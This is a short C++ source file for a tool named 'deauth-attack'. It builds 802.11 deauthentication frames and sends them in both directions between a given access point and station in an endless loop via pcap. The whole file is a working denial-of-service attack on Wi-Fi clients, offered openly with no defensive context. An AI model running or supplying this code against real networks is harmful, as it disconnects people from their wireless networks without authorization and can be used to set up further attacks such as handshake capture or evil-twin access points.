#include <pcap.h>
#include <iostream>
#include <net/if.h>

#include "send_deauth.h"
#include "radiotaphdr.h"
#include "beaconhdr.h"
#include "mac.h"

DeauthPacket deauthPacket[2];

void usage(){
    std::cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>]\n";
    std::cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n"; 
}

void deauth(pcap_t* handle, Mac apMac, Mac stationMac, int mode){
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    deauthPacket[0].radiotapHdr.len_ = htons(12);
    deauthPacket[0].radiotapHdr.present_ = htonl(0x048000);
    deauthPacket[0].beaconHdr.ver_ = 0;
    deauthPacket[0].beaconHdr.type_ = 0;
    deauthPacket[0].beaconHdr.subtype_ = htons(12);
    deauthPacket[0].beaconHdr.addr1_ = stationMac;
    deauthPacket[0].beaconHdr.addr2_ = apMac;
    deauthPacket[0].beaconHdr.addr3_ = stationMac;
    
    deauthPacket[1].radiotapHdr.len_ = htons(12);
    deauthPacket[1].radiotapHdr.present_ = htonl(0x048000);
    deauthPacket[1].beaconHdr.ver_ = 0;
    deauthPacket[1].beaconHdr.type_ = 0;
    deauthPacket[1].beaconHdr.subtype_ = htons(12);
    deauthPacket[1].beaconHdr.addr1_ = apMac;
    deauthPacket[1].beaconHdr.addr2_ = stationMac;
    deauthPacket[1].beaconHdr.addr3_ = apMac;

    while(true){
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&deauthPacket[0]), sizeof(DeauthPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&deauthPacket[1]), sizeof(DeauthPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
}
